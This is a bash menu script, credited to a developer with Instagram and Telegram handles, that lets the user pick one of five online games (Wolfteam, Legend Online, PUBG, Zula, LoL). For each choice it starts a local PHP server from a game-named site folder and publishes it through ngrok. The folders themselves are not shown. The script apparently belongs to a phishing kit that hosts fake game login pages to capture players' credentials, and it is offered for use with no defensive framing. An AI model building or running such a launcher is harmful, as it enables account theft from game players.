#!/bin/bash

#Developer:Nihat 「 FARZ 」
#İnstagram : @NihatFarz
#Telegram : NihatFarz
clear
echo -e  "


\e[35m     ((( Telegram  @MaragliWeb )))



\e[31m[01]\e[32m Wolfteam               \e[31m[04]\e[32m Zula
\e[31m[02]\e[32m Legend Online          \e[31m[05]\e[32m LoL
\e[31m[03]\e[32m Pubg


\e[31m[00]\e[37m Menyu
\e[31m[99]\e[37m Çıxış
"
echo -e "\e[49m"
read -p "Seçim Edin: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
	read -p "Port Girin: " port
        echo -e "\e[32mCode: game01"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-wolfteam/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Girin: " port
        echo -e "\e[32mCode: game02"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-legend/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 3 || $islem == 03 ]]; then
        read -p "Port Girin: " port
        echo -e "\e[32mCode: game03"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-pubg/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 4 || $islem == 04 ]]; then
        read -p "Port Girin: " port 
	echo -e "\e[32mCode: game04"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-zula/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 5 || $islem == 05 ]]; then
        read -p "Port Girin: " port
        echo -e "\e[32mCode: game05"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-lol/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash farz.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mKanalımızı İzləmədə qalın @MaragliWeb :)) ßß"
exit 1
else
echo ""
echo -e "\e[31m Seçiminizi düzgün edin...."
sleep 3
clear
bash start.sh
fi
